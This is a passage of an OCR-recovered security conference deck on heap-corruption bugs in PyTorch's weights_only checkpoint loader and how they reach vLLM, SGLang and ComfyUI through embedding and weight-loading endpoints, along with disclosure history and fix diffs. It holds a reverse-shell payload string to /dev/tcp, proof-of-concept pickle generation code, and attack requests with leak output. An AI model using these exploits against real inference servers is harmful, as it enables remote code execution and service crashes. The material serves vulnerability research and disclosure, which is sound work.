data_ptr_.ptr_.data_ ° data_ptr_.ptr_.ctx_.deleter e-
size_bytes_ [next™ fields omitted]
Target Real Memory overwritten Payload)
"bash -i >&/dev/tcp/ip/port 0>&1\0"
Hijacked Destructor Logic
system(ctx_.ptr);
// exec shell payload
80
```

## Slide 81

81

## Slide 82

### **Bypass Again!**

82

https://github.com/pytorch/pytorch/security/advisories/GHSA-63cw-57p8-fm3p


> Recovered by OCR — confidence 92/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Bypass Again!
Loading a malicious PyTorch checkpoint with weights_only=True can result in Eait advisory
arbitrary code execution
© Published malfet published GHSA-63cw-57p8-fm3p on Jan 27 - 34 comments
Package Affected versions Patched versions Severity
@ pytorch (pip), <=2.9.1 >=2.10.0 8.8 /10
CVSS v3 base metrics
azraelxuemo opened on Jun 28, 2025 + edited by malfet ~ lee Attack vector Network
Attack complexity Low
Description Privileges required None
User interaction Required
Summary Scope Unchanged
A vulnerability in PyTorch's weights_only unpickler allows an attacker to craft a malicious checkpoint file ( .pth ) that, when Confidentiality High
loaded with torch. load(..., weights_only=True) , can corrupt memory and potentially lead to arbitrary code execution. Integrity High
Availability High
Vulnerability Details Learn more about base metrics
The weights_only=True unpickler failed to properly validate pickle opcodes and storage metadata, allowing: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
1. Heap memory corruption via SETITEM / SETITEMS opcodes applied to non-dictionary types
CVEID
2. Storage size mismatch between declared element count and actual data in the archive
CVE-2026-24747
Impact
An attacker who can convince a user to load a malicious checkpoint file may achieve arbitrary code execution in the context of the
victim's process. No CWEs
Credit Credits
Ji'an Zhou
https://github.com/pytorch/pytorch/security/advisories/GHSA-63cw-57p8-fm3p
```

## Slide 83

### **Back to vLLM**

83


> Recovered by OCR — confidence 87/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
"Back to vLLM
POST /v1/completions { “prompt_embeds": "<base64>" }
api_server.py:651 handler.create_completion(request, raw_request)
request.prompt_embeds)
weights_only=True)
|— serving_completion.py:138 renderer.render_prompt_and_embeds(prompt_embeds=
import requests
import base64
url = "http://127.0.0.1:8000/v1/completions"
headers = {
"Content-Type": "application/json"
}
with open("tensor.pt","rb") as f:
content=base64. b64encode(f.read()).decode()
data = {
}
requests.post(url, headers=headers, json=data)
83
```

## Slide 84

84

## Slide 85

🤕 I do not want this f***ing trick

85

## Slide 86

🤕 I do not want this f***ing trick

😭 Direct torch.load attack with PIE

❌

86

## Slide 87

🤕 I do not want this f***ing trick

🫠 What about vLLM with PIE?

87

## Slide 88

### **Inspiration**

88


> Recovered by OCR — confidence 81/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Inspiration
xuemo>curl http://localhost:8000/v1/completions -H "Content-Type: application/json" -d '{
"model": "facebook/opt-125m",
"prompta": "Hello, my name is",
"max_tokens": 50
{"error":{"message":"[{'type': 'value_error', 'loc': ('body',), 'msg': 'Value error, Either prompt or prompt_embeds mus
t be provided and no = tioul is', 'max_tokens': 50
}, 'ctx': {'error': |ValueError('Either prompt or prompt_embeds must be provided and non-empty.')}}]",|"type":"Bad Reques
88
```

## Slide 89

### **Error Exfiltration**

❌

✅

89


> Recovered by OCR — confidence 84/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
"Error Exfiltration
x Vv]
elif key[@] == BINPERSID[Q]:
elif key[0] == APPEND[Q]: pid = self.stack. pop()
item = self.stack.pop() wee
list_obj = self.stack[-1] if (
. . . . : type(pid) is tuple
if type(list_obj) is not list: and len(pid) > 0
raise UnpicklingError( and torch,serialization._maybe_decode_ascii(pid[@]) != "storage"
f"Can only append to lists,
but got {type(list_obj )} f"Only persistent_load of storage is allowed, but got
) {pid[@]}"
89
```

## Slide 90

### **It Works!**

90


> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
“It Works!
elif key[@] == BINPERSID[Q]:
pid = self.stack.pop()
if (
type(pid) is tuple
and len(pid) > @
and torch.serialization._maybe_decode_ascii(pid[@]) != "storage"
raise UnpicklingError(
f"Only_persistent_load of storage is allowed, but got
)
self.append(self.persistent_load(pid) )
overflow_length = 256
poc = generate_overflow_tensor_pid(overflow_length, @)
poc += TUPLE1+BINPERSID
poc += STOP
with open("tensor/data.pkl","wb") as f:
f.write(poc)
os.system("zip -r tensor.pt tensor/")
import torch
Traceback (most recent call last):
File "/home/xuemo/pytorch-2.8.0/load.py", line 2, in <module>
File "/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/serialization.py", line 1
529, in load
raise pickle.UnpicklingError(_get_wo_message(str(e))) from None
_pickle.UnpicklingError: Weights only load failed. In PyTorch 2.6, we changed the default value of t
he “weights_only” argument in “torch.load’ from “False” to ‘True’. Re-running “torch.load* with “wei
ghts_only* set to ‘False’ will likely succeed, but it can result in arbitrary code execution. Do it
only if you got the file from a trusted source.
Please file an issue with the following so that we can make ‘weights_only=True’ compatible with your
use case: WeightsUnpickler error: Only persistent_load of storage is allowed, but got tensor([
10, 281474976710673, 33,
126486786867200, 126815498681248, 4572279526795640868,
33, 126491081834496, 126815498681120,
0, 33, 126495376801792,
126815498681120, 0, 49,
126499671769088 , 126815498681152, 249950292643938704,
24576089, 48, 977,
1, 10666592, 385,
90
```

## Slide 91

### **Works in vLLM!**

91


> Recovered by OCR — confidence 83/100 on the text kept, 76/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
import requests
import base64
url = “http://127.0.0.1:8000/v1/completions"
headers = {
"Content-Type": “application/json"
"Works in vLLM!
}
with open("tensor.pt","rb") as f:
data = {
}
response = requests.post(url, headers=headers, json=data)
print("Status Code:", response.status_code)
Status Code: 500
{"error":{"message":"Weights only load failed. In PyTorch 2.6, we changed the default value of the “weights_only* argum
ent in “torch.load* from ‘False’ to ‘True’. Re-running “torch.load* with ‘weights_only* set to “False* will likely succ
eed, but it can result in arbitrary code execution. Do it only if you got the file from a trusted source.\nPlease file
an_issue with the following so that we can make ‘weights only=True* compatible with your use case: WeightsUnpickler err
or: Only persistent_load of storage is allowed, but got tensor([ a van
8, 9,\n 10, Q, 81,\n 14063427522076
8, 235788384, @,\n Q, Q, 221,\n
Abs 352951805673476, 82,\n 208, 140634025451320,
Q, 235799328, 235799336, \n 235799336, Q, @,\
@,\n Q, 208, 193,\n 235747728, 27
66409169796213799, 235738272, \n Q, Q, 235799360, \n
108083376, 140628152523088, @,\n Q, Q,
Q, Q, 255, 1,\n 35295180567
3476, 1271310385153, 225,\n 235799088, 140634275220912, 235738272, \n
236341824, Q, 235799360, \n 108083376, 140627898250448,
e, 5, 1,\n 352951805673476, 1271310385153, 3
3,\n 236291120, 235738864, 224,\n 32, 154130528
; 235731424, \n 140627898261744, 225; 140634275220912, \n 235798832, 91
```

## Slide 92

### 🤩 Bounty?

**vLLM**

Powers fast LLM endpoints in the cloud.

**$40,000**

92

## Slide 93

### 😭 Not allowed to participate

**Who can participate in the contest?**

Anyone over the age of majority in their country/state of residence can participate. Teams of 2–5 members or individual participants may enter. Employees of Wiz, its affiliates, and partner companies (AWS, GCP, Azure) cannot participate. Participants cannot be residents of embargoed or sanctioned countries (e.g., Russia, China, Iran, North Korea, Cuba, Sudan, Syria, Libya, Lebanon, or restricted regions like Crimea, Donetsk, etc.). If competing as part of a company, only one individual or one team can represent that company, and you must have proper authorization from your employer to register and bind the company to the contest rules. For complete eligibility requirements, please review the full contest rules.

**Re: Some questions about the rules** ☆

**zerodaycloud** <zerodaycloud@wiz.io>
由 gili.ben.zvi@wiz.io 代发
收件人 我 <[illegible]>

邮件可翻译为中文  全文翻译

Hello,
Unfortunately we cannot accept submissions from residents of China due to internal policies and requirements.

Best,
Zeroday Cloud Team

93

## Slide 94

### **Report it to the Official Team**

**vllm.entrypoints.openai.api_server RCE**

**Closed** · **Critical** · **azraelxuemo** opened **GHSA-v467-pj72-qc6v** on Nov 4, 2025 · 18 comments

| Package | Affected versions | Patched versions |
| --- | --- | --- |
| **vllm** (pip) | 0.11.0 | None |

**azraelxuemo** opened on Nov 4, 2025 · edited

Description

### Description

A heap overflow vulnerability exists in vLLM, leading to RCE (Remote Code Execution).

### Credit

Ji'an Zhou

**russellb** commented on Nov 5, 2025 — Member

OK, thanks for letting us know! We'll wait for PyTorch to finish their evaluation and remediation first before we do anything on the vLLM side.

**russellb** accepted this report on Nov 5, 2025

94

## Slide 95

### 🤣 **Fixed Before the Competition**

Nov 19, 2025

khluu

v0.11.1

4393684

Compare ▾

**v0.11.1**

**Highlights**

This release inclu…

```python
def load_prompt_embeds(
        self,
        prompt_embeds: bytes | list[bytes],
        ...
    ) -> list[EngineEmbedsPrompt]:
        if not self.model_config.enable_prompt_embeds:
            raise ValueError(
                "You must set `--enable-prompt-embeds`
                           to input `prompt_embeds`."
            )
        ...
            tensor = torch.load(
                io.BytesIO(pybase64.b64decode(embed, validate=True)),
                weights_only=True,
                map_location=torch.device("cpu"),
            )
```

95

## Slide 96

### **Unpwned**

**ZERODAY.CLOUD**

**Schedule**

| **DAY 2** | |
| --- | --- |
| 10:30 | Welcome back to zeroday.cloud! |
| 10:45 | Daniel Firer targeting Redis |
| 11:20 | Team Bugz Bunnies targeting PostgreSQL |
| 12:00 | Lunch Break |
| 12:45 | Team Theori targeting Redis |
| 13:20 | Bohdan Ivanenko targeting vLLM |
| 14:00 | Team Theori targeting MariaDB |
| 14:40 | Team Bugz Bunnies targeting Ollama |
| 15:00 | Operation Cloudfall: Wrap-up |
| 15:20 | Closing Ceremony and Winner Announcements |
| 16:00 | ZeroNightCloud After Party! |

96

## Slide 97

### **PyTorch Fix**

**torch/csrc/jit/python/init.cpp** — +14 -1 · ☐ Viewed

`@@ -1613,10 +1613,23 @@ void initJITBindings(PyObject* module) {`

Left side (before):

```cpp
1613              const std::string& key,
1614              size_t numel,
1615              py::object data_type_obj) {
1616 -            at::DataPtr data(std::get<0>
         (self.getRecord(key)));
1617              auto scalar_type =
1618                  reinterpret_cast<THPDtype*>
         (data_type_obj.ptr())->scalar_type;
1619

1620              c10::Storage storage(
1621                  c10::Storage::use_byte_size_t(),
1622                  numel * elementSize(scalar_type),
```

Right side (after):

```cpp
1613              const std::string& key,
1614              size_t numel,
1615              py::object data_type_obj) {
1616 +            auto [data, size] = self.getRecord(key);
1617              auto scalar_type =
1618                  reinterpret_cast<THPDtype*>
         (data_type_obj.ptr())->scalar_type;
1619
1620 +            TORCH_CHECK(
1621 +                size == numel * elementSize(scalar_type),
1622 +                "record size (",
1623 +                size,
1624 +                " bytes) does not match expected size (",
1625 +                numel * elementSize(scalar_type),
1626 +                " bytes = ",
1627 +                numel,
1628 +                " elements * ",
1629 +                elementSize(scalar_type),
1630 +                " bytes/element) for dtype ",
1631 +                scalar_type);
1632 +
1633              c10::Storage storage(
1634                  c10::Storage::use_byte_size_t(),
1635                  numel * elementSize(scalar_type),
```

97

https://github.com/pytorch/pytorch/pull/170085

## Slide 98

### **PyTorch Fix**

**torch/_weights_only_unpickler.py** — +10 -1 · ☐ Viewed

`@@ -468,9 +468,11 @@ def load(self):`

Left side (before):

```python
                     list_obj.extend(items)
                 elif key[0] == SETITEM[0]:
                     (v, k) = (self.stack.pop(), self.stack.pop())

                     self.stack[-1][k] = v
                 elif key[0] == SETITEMS[0]:
                     items = self.pop_mark()
```

Right side (after):

```python
468                  list_obj.extend(items)
469              elif key[0] == SETITEM[0]:
470                  (v, k) = (self.stack.pop(), self.stack.pop())
471 +                self._check_set_item_target("SETITEM")
472                  self.stack[-1][k] = v
473              elif key[0] == SETITEMS[0]:
474                  items = self.pop_mark()
475 +                self._check_set_item_target("SETITEMS")
```

Added (right side only):

```python
578 +    def _check_set_item_target(self, opcode: str):
579 +        if type(self.stack[-1]) not in [dict, OrderedDict,
       Counter]:
580 +            raise UnpicklingError(
581 +                f"Can only {opcode} for dict,
       collections.OrderedDict, "
582 +                f"collections.Counter, but got
       {type(self.stack[-1])}"
583 +            )
584 +
```

Left side (before):

```python
534                  and
       torch.serialization._maybe_decode_ascii(pid[0]) != "storage"
535              ):
536                  raise UnpicklingError(
537 -                    f"Only persistent_load of storage is
       allowed, but got {pid[0]}"
538                  )
539              self.append(self.persistent_load(pid))
540          elif key[0] in [BINGET[0], LONG_BINGET[0]]:
```

Right side (after):

```python
536                  and
       torch.serialization._maybe_decode_ascii(pid[0]) != "storage"
537              ):
538                  raise UnpicklingError(
539 +                    f"Only persistent_load of storage is
       allowed, but got {type(pid[0])}"
540                  )
541              self.append(self.persistent_load(pid))
542          elif key[0] in [BINGET[0], LONG_BINGET[0]]:
```

98

https://github.com/pytorch/pytorch/pull/170085

## Slide 99

### **Change the Security Statement**

**Closed** — **Document limitations of weights_only in SECURITY.md and torch.load doc** #165645

All commits ▾ | **mikaylagawarecki** wants to merge 5 commits into `gh/mikaylagawarecki/355/b…` from `gh/mikaylagawarecki/355/…`

**0 / 3** viewed | **Submit comments** ▾

Filter files…

- docs/source/notes
  - serialization.rst
- torch
  - serialization.py
- SECURITY.md

**SECURITY.md** — +2 -2 · ☐ Viewed

Left side (before):

```markdown
        environment such as a sandbox** (e.g., containers, virtual
        machines). This helps protect your system from potentially
        malicious code. You can find further details and instructions
        in [this page](https://developers.google.com/code-sandboxing).
33
34 -    **Be mindful of risky model formats**. Give preference to
        share and load weights with the appropriate format for your
        use case. [safetensors]
        (https://huggingface.co/docs/safetensors/en/index) gives the
        most safety but is the most restricted in what it supports.
        [`torch.load`]
        (https://pytorch.org/docs/stable/generated/torch.load.html#tor
        ch.load) with `weights_only=True` is also secure to our
        knowledge even though it offers significantly larger surface
        of attack. Loading un-trusted checkpoint with
        `weights_only=False` MUST never be done.
35 -
36
```

Right side (after):

```markdown
        environment such as a sandbox** (e.g., containers, virtual
        machines). This helps protect your system from potentially
        malicious code. You can find further details and instructions
        in [this page](https://developers.google.com/code-sandboxing).
33
34 +    **Be mindful of risky model formats**. Give preference to
        share and load weights with the appropriate format for your
        use case. [safetensors]
        (https://huggingface.co/docs/safetensors/en/index) gives the
        most safety but is the most restricted in what it supports.
        [`torch.load`]
        (https://pytorch.org/docs/stable/generated/torch.load.html#tor
        ch.load) has a significantly larger surface of attack but is
        more flexible in what it can serialize. See the documentation
        for more details.
35
36 +    Even for more secure serialization formats, unexpected inputs
        to the downstream system can cause diverse security threats
        (e.g. denial of service, out of bound reads/writes) and thus
        we recommend extensive validation of any untrusted inputs.
```

99

https://github.com/pytorch/pytorch/pull/165645/

## Slide 100

### **Final Fix**

**russellb** commented on Mar 10 — Member

torch 2.10 is in use as of v0.17.0.

Since it's already published as part of a torch CVE, I'm not sure we need to publish an advisory here.

https://nvd.nist.gov/vuln/detail/CVE-2026-24747

**russellb** closed this on Mar 10

**russellb** commented on Mar 10 — Member

I'm going to close this out now that a release is out with 2.10. Since pytorch has their own CVE already published, I don't think we need to publish a separate one.

Thanks again for the report.

100

## Slide 101

PART 04

One Chain, All Owned

101

## Slide 102

🤨 Why did vLLM introduce this feature?

102

## Slide 103

### **Motivation Behind This Feature**

Home > User Guide > Features

### Prompt Embedding Inputs

This page teaches you how to pass prompt embedding inputs to vLLM.

### What are prompt embeddings?

The traditional flow of text data for a Large Language Model goes from text to token ids (via a tokenizer) then from token ids to prompt embeddings. For a traditional decoder-only model (such as meta-llama/Llama-3.1-8B-Instruct), this step of converting token ids to prompt embeddings happens via a look-up from a learned embedding matrix, but the model is not limited to processing only the embeddings corresponding to its token vocabulary.

103

https://docs.vllm.ai/en/latest/features/prompt_embeds/

## Slide 104

### **Motivation Behind This Feature**

### Prompt Embeddings

NVIDIA NIM for Large Language Models supports prompt embeddings, also known as prompt embeds, as a secure alternative to traditional text prompts. Applications can use precomputed embeddings for inference to support more flexible prompt engineering and improve privacy and data security. With prompt embeddings, applications transform sensitive user data into embeddings before sending requests to the inference server, which reduces the risk of exposing confidential information during the AI workflow.

Prompt embeddings support the following use cases:

- **Privacy-Preserving AI**: Convert sensitive prompts to embeddings before sending them to the server.
- **Custom Embedding Models**: Use specialized, domain-specific embedding models.
- **Embedding Caching**: Precompute and cache frequently used embeddings.
- **Advanced Prompt Engineering**: Implement sophisticated preprocessing pipelines.
- **Multistage Pipelines**: Integrate with proxy services that operate on embeddings.

For background information about prompt embeddings, refer to the vLLM Prompt Embeds documentation.

104

https://docs.nvidia.com/nim/large-language-models/latest/advanced-use-cases/prompt-embeds.html

## Slide 105

### **Other Affected Components**

*Logos of affected AI-serving projects: vLLM, OpenLLM, NVIDIA Dynamo, SGLang (SGL), and Comfy.*

NVIDIA Dynamo banner — "AI Inference / NVIDIA Dynamo / Scale and Serve Generative AI, Fast." with layered component labels: API Server, GPU Planner, Smart Router, Cache Manager, Communication Library

105

## Slide 106

### **What is OpenLLM?**

*OpenLLM logo.*

**💪 OpenLLM: Self-Hosting LLMs Made Easy**

`License | Apache 2`  `PyPI | v0.6.30`  `pre-commit.ci | passed`  `Follow | @bentomlai`  `Join | Community`

OpenLLM allows developers to run **any open-source LLMs** (Llama 3.3, Qwen2.5, Phi3 and more) or **custom models** as **OpenAI-compatible APIs** with a single command. It features a built-in chat UI, state-of-the-art inference backends, and a simplified workflow for creating enterprise-grade cloud deployment with Docker, Kubernetes, and BentoCloud.

Understand the design philosophy of OpenLLM.

106

## Slide 107

### **Configuration**

*GitHub file view — breadcrumb:* **main** › openllm-models / bentoml / bentos / llama3.1 / 8b-instruct-239c / **bento.yaml** *· tabs: Code | Blame*

```text
68        type: string
69        is_stream: true
70        media_type: text/event-stream
71      is_task: false
72    args: {}
73    spec: 2
74    image:
75      base_image: python:3.11-slim
76      python_version: '3.11'
77      commands:
78      - apt-get update && apt-get install -q -y --no-install-recommends --allow-remove-essential
79        ca-certificates gnupg2 bash build-essential git
80      python_requirements: 'bentoml==1.4.12
81
82        vllm==0.8.5
83
84        fastapi==0.115.4
85
86        pydantic==2.11.1
87
88        openai==1.69.0
89
90        bentoml==1.4.12
```

*(line 82 `vllm==0.8.5` is highlighted in red)*

https://github.com/bentoml/openllm-models

107

## Slide 108

### **Architecture**

*Diagram. Outer dashed box labeled* **OpenLLM** *contains:*

- **OpenLLM CLI + BentoML + openllm-models** — packaging / config / deployment
- ↓ *transparent proxy*
- **vLLM OpenAI-Compatible Server** — vllm.entrypoints.openai.api_server
  - /v1/chat/completions
  - /v1/completions
  - /v1/embeddings
  - /v1/models

108

## Slide 109

### **Source -> Sink**

```text
HTTP POST /v1/chat/completions
    payload: {"type": "image_embeds", "image_embeds": "<base64-data>"}
    |
    ├─→ api_server.py:466          create_chat_completion(request, raw_request)
    |
    ├─→ serving_chat.py:121        create_chat_completion()
    |     └ line 183:              self._preprocess_chat(...)
    |
    ├─→ serving_engine.py:403      _preprocess_chat()
    |     └                        parse_chat_messages_futures(messages, ...)
    |
    ├─→ chat_utils.py:1155         parse_chat_messages_futures()
    |     └ line 1165:             _parse_chat_message_content(message, ...)
    |
    ├─→ chat_utils.py:1075         _parse_chat_message_content()
    |     └ line 1089:             _parse_chat_message_content_parts(parts, ...)
    |
    ├─→ chat_utils.py:977          _parse_chat_message_content_parts()
    |     └ line 989:              _parse_chat_message_content_part(part, ...)
    |
    ├─→ chat_utils.py:1010         _parse_chat_message_content_part()
    |     └ line 1048-1051:        if part_type == "image_embeds":
    |                                  mm_parser.parse_image_embeds(content)
    |
    ├─→ chat_utils.py:749          AsyncMultiModalContentParser.parse_image_embeds()
    |     └                        self._connector.fetch_image_embedding(image_embeds_str)
    |
    ├─→ multimodal/utils.py:245    MediaConnector.fetch_image_embedding(data)
    |     └                        ImageEmbeddingMediaIO().load_base64("", data)
    |
    ├─→ multimodal/image.py:70     load_base64(media_type, data)
    |     └                        self.load_bytes(base64.b64decode(data))
    |
    └─→ multimodal/image.py:67-68  load_bytes(data)
          └                        torch.load(BytesIO(data), weights_only=True)
```

109

## Slide 110

### **What is SGLang?**

*SGLang (SGL) logo.*

`pypi | v0.5.13`  `downloads | 834M`  `license | Apache-2.0`  `closed issues | 5.5k`  `open issues | 658`  `Ask DeepWiki`

### About

SGLang is a high-performance serving framework for large language models and multimodal models. It is designed to deliver low-latency and high-throughput inference across a wide range of setups, from a single GPU to large distributed clusters. Its core features include:

110

## Slide 111

### **Source -> Sink**

*Two side-by-side code panels connected by red arrows. Left panel top → right panel middle → left panel bottom.*

Endpoint handler:
```text
@app.post("/update_weights_from_disk")
@auth_level(AuthLevel.ADMIN_OPTIONAL)
async def update_weights_from_disk(obj: UpdateWeightFromDiskReqInput, request: Request):
    """Update the weights from disk inplace without re-launching the server."""
    (
        success,
        message,
        num_paused_requests,
    ) = await _global_state.tokenizer_manager.update_weights_from_disk(obj, request)
```

Request dataclass:
```text
@dataclass
class UpdateWeightFromDiskReqInput(BaseReq):
    # The model path with the new weights
    model_path: str
    # The format to load the weights
    load_format: Optional[str] = None
    # Whether to abort all requests before updating weights
    abort_all_requests: bool = False
```
*(`model_path: str` is highlighted in red)*

Weight download:
```text
if not is_local:
    hf_folder = download_weights_from_hf(
        model_name_or_path,
        self.load_config.download_dir,
        allow_patterns,
        revision,
        ignore_patterns=self.load_config.ignore_patterns,
    )
```

Checkpoint loader:
```text
def _load_pt_file(bin_file: str) -> dict:
    """Load a PyTorch checkpoint file, handling legacy tar format.

    PyTorch 2.6 changed the default of weights_only from False to True.
    Legacy tar format files cannot be loaded with weights_only=True.
    This function tries weights_only=True first, then falls back to False
    for legacy tar format files from trusted sources (HuggingFace Hub).
    """
    try:
        return torch.load(bin_file, map_location="cpu", weights_only=True)
```

111

## Slide 112

### **Motivation Behind This Feature**

### Update Weights From Disk

Update model weights from disk without restarting the server. Only applicable for models with the same architecture and parameter size.

SGLang support `update_weights_from_disk` API for continuous evaluation during training (save checkpoint to disk and update weights from disk).

Example:
```python
# successful update with same architecture and size
url = f"http://localhost:{port}/update_weights_from_disk"
data = {"model_path": "qwen/qwen2.5-0.5b-instruct"}

response = requests.post(url, json=data)
print_highlight(response.text)
assert response.json()["success"] is True
assert response.json()["message"] == "Succeeded to update model weights."
```

https://docs.sglang.io/docs/basic_usage/native_api

112

## Slide 113

### **Crash? Why?**

Launch command:
```text
python -m sglang.launch_server
  --model-path {{model}} --host 0.0.0.0  --port 30000
```

Attack request:
```text
curl -s http://localhost:30000/update_weights_from_disk
        -H 'Content-Type: application/json'
          -d '{"model_path":"{{evil_model_on_hf}}",
                "flush_cache":true}'
```

Terminal output:
```text
    return torch.load(bin_file, map_location="cpu", weights_only=True)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/[...]/Desktop/[...] venv/lib/python3.12/site-packages/torch/serialization.py", line 1529, in load
    raise pickle.UnpicklingError(_get_wo_message(str(e))) from None
_pickle.UnpicklingError: Weights only load failed. In PyTorch 2.6, we changed the default value of the `weights_only` argument in `torch.load` from `False` to `T[...]
t to `False` will likely succeed, but it can result in arbitrary code execution. Do it only if you got the file from a trusted source.
Please file an issue with the following so that we can make `weights_only=True` compatible with your use case: WeightsUnpickler error:

Only persistent_load of storage is allowed, but got tensor([                 1,                   2,                   3,
                 4,                   5,                   6,
                 7,                   8,                   9,
                10, 7957695013524078592,                  85,
   131459831146098, 6049905579691883710,     131458154763392,
                 0,     131428549404288,     131428549404272,
   131457927717654,     131457927713888, 7598545042164156230,
                85,     131459831146274, 6049905579691883710,
   131458154763392,                   0,     131428549394433,
   131428549420688,     131428549420800,     131428549421208])

Check the documentation of torch.load to learn more about types accepted by default with weights_only https://pytorch.org/docs/stable/generated/torch.load.html.

[2026-06-28 21:09:01] SIGQUIT received. signum=None, frame=None. It usually means one child failed.
Killed
```

113

## Slide 114

### **The Difference**

**vLLM: Survives — Exception stays in-process**

```text
HTTP Request
  → torch.load() throws UnpicklingError
  → except Exception catches it
  → Returns HTTP 500 with error message
  → Server stays alive ✅
```

```text
@router.post("/v1/completions")
async def create_completion(request: CompletionRequest, raw_request: Request):
    handler = completion(raw_request)
    ...
    try:
        generator = await handler.create_completion(request, raw_request)
    ...
    except Exception as e:  #UnpicklingError IS a subclass of Exception
        raise HTTPException(status_code=HTTPStatus.INTERNAL_SERVER_ERROR.value,
                            detail=str(e)) from e

@app.exception_handler(HTTPException)
    async def http_exception_handler(_: Request, exc: HTTPException):
        err = ErrorResponse(
            error=ErrorInfo(message=exc.detail,
                            type=HTTPStatus(exc.status_code).phrase,
                            code=exc.status_code))
        return JSONResponse(err.model_dump(), status_code=exc.status_code)
```

**SGLang: Dies — Exception crosses process boundary**

```text
HTTP Process → ZMQ → Scheduler → ZMQ → Worker Process
                          ↓
                  torch.load() throws
                  UnpicklingError
                          ↓
                  No try/except on rollback
                          ↓
                  Worker process exits
                          ↓
                  Scheduler receives SIGQUIT
                          ↓
                  Kills entire process tree ❌
```

114

## Slide 115

😬 No PIE required, only exploitable via the trick.

115

## Slide 116

### **Upgrade PyTorch Version to Resolve This Issue**

*GitHub file view — breadcrumb:* **sglang** / python / **pyproject.toml** *· tabs: Code | Blame · Executable File · 231 lines (211 lo...)*

```text
75      "torch==2.11.0",
76      "torch_memory_saver>=0.0.9.post1",
77      "torchao==0.17.0",
78      "torchaudio==2.11.0",
79      "torchcodec==0.11.1 ; sys_platform != 'li
80      "torchvision",
81      "tqdm",
82      "transformers==5.12.1",
83      "uvicorn",
84      "uvloop",
85      "watchfiles",
86      "xgrammar==0.2.1",
87      "zstandard",
88    ]
```

116

## Slide 117

### **What is ComfyUI?**

*ComfyUI logo.*

The most powerful and modular visual AI engine and application.

`ComfyOrg`  `Discord | 55128 total`  `Follow @ComfyUI`  `[m] Matrix`
`release | v0.19.0`  `release date | last monday`  `downloads | 3.8M`  `downloads@latest | 19k`

117

## Slide 118

### **Demo Web Page**

118


> Recovered by OCR — confidence 82/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
“Demo Web Page
Workfiow Edit Help Image Generation ©
beautiful scenery nature glass bottle landscape, , purple galaxy bottle, Comfyut
156680208700286
randomize
20
8.0
© cig
text, watermark
v1-S-pruned-emaonly.safete... >
```

## Slide 119

### **Feature**

119

https://comfyui-wiki.com/en/comfyui-nodes/loaders/checkpoint-loader-simple


> Recovered by OCR — confidence 88/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Feature
nglish interface XRD
Load Checkpoint Checkpointil®#
MODEL @
CLIP @
VAE @
CLIP @
VAE @
Load Checkpoint | Checkpointhh#tzs (2)
Documentation
e Class name: CheckpointLoaderSimple
e Category: loaders
¢ Output node: False
The CheckpointLoaderSimple node is designed for loading model checkpoints without the need for specifying
a configuration. It simplifies the process of checkpoint loading by requiring only the checkpoint name, making
it more accessible for users who may not be familiar with the configuration details.
https://comfyui-wiki.com/en/comfyui-nodes/loaders/checkpoint-loader-simple
119
```

## Slide 120

### **The Vuln**

120


> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
"The Vuln
class CheckpointLoaderSimple:
def load_checkpoint(self, ckpt_name):
ckpt_path = folder_paths.get_full_path_or_raise("checkpoints", ckpt_name)
out = comfy.sd.|load_checkpoint_guess_config(ckpt_path, output_vae=True,
return out[:3]
def load_checkpoint_guess_config(ckpt_path, ...):
sd, metadata = comfy.utils; load_torch_file(ckpt_path, return_metadata=True)
return out
def load_torch_file(ckpt, safe_load=False, device=None, return_metadata=False) :
if device is None:
device = torch.device("cpu")
metadata = None
if ckpt.lower().endswith(".safetensors") or ckpt.lower().endswith(".sft"):
else:
torch_args = {}
if MMAP_TORCH_FILES:
torch_args["mmap"] = True
pl_sd =|torch.load(ckpt, map_location=device, weights_only=True, *ktorch_args) 120
```

## Slide 121

### **Leak Achieved**

121


> Recovered by OCR — confidence 89/100 on the text kept, 86/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
“Leak Achieved
Unsaved Workflow @
overflow_length = 256
poc += TUPLE1+BINPERSID
poc += STOP
Am
with open("tensor/data.pkl","wb") as f:
f.write(poc)
os.system("zip -r tensor.pt tensor/")
File "/app/comfy/utils.py", line 88, in load_torch file
pl_sd = torch.load(ckpt, map_location=device, weights_only=True, **torch_args)
File "/opt/conda/1lib/python3.11/site-packages/torch/serialization.py", line 1529, in load
raise pickle.UnpicklingError(_get_wo_message(str(e))) from None
_pickle.UnpicklingError: Weights only load failed. In PyTorch 2.6, we changed the default value of the ~weights_only~ argu
to ~True~. Re-running ~torch.load~ with ~weights_only~ set to ~False~ will likely succeed, but it can result in arbitrary
got the file from a trusted source.
Please file an issue with the following so that we can make ~weights_only=True~ compatible with your use case: WeightsUnpi|
Only persistent_load of storage is allowed, but got tensor([ 1, 2, 3,
10, -54860123138473473, ANT,
136375604260568, 4294967298, 136368500026816,
136374743898800, 136368500026816, 3537586595450322688,
2048, 432345564227567616, 0, _
136370543981344, 37, 136369506615296, [+] Upload success: {'name': 'pwn_fjwolf.ckpt', 'subfolder': ‘check
136368499982480, 0, 37, points', 'type': ‘output'}
136373801582592, 136368499982480, 0, [+] Triggering checkpoint load...
0, 37, 136382391517184, [+] Trigger response: 200
136368499982480, 0, 37, [+] Response: {"prompt_id": "6d283cc8-9399-42ce—a769—fe8056e53764",
136386686484480, 136368499982480, 0, "number": @, "node_errors": {}}
